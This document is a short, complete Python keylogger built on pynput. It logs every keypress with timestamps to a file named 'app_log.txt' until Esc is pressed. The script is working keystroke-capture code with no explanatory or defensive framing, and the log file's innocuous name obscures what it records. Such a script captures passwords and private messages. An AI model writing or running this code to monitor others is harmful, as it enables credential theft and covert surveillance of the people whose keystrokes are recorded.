from pynput.keyboard import Key, Listener
import logging

# Set up logging to save keystrokes to a file named 'app_log.txt'
log_dir = ""
logging.basicConfig(filename=(log_dir + "app_log.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Record the character pressed
        logging.info(str(key.char))
    except AttributeError:
        # Handle special keys (Space, Enter, Ctrl, etc.)
        logging.info(str(key))

def on_release(key):
    # Stop the listener if the 'Esc' key is pressed
    if key == Key.esc:
        return False

# Start the listener
print("Monitoring started... Press ESC to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()